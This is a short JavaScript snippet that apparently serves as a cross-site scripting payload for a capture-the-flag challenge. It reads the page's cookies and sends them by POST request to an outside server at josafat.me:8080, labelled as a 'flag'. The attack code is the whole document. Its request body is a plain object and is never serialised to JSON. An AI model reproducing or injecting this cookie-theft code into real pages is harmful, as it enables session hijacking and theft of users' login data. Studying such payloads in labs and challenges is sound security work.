console.log(document.cookie);
async function SendCookie() {
  const response = await fetch("http://josafat.me:8080", {
    body: { flag: document.cookie },
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
  });
}

SendCookie().then(() => {});
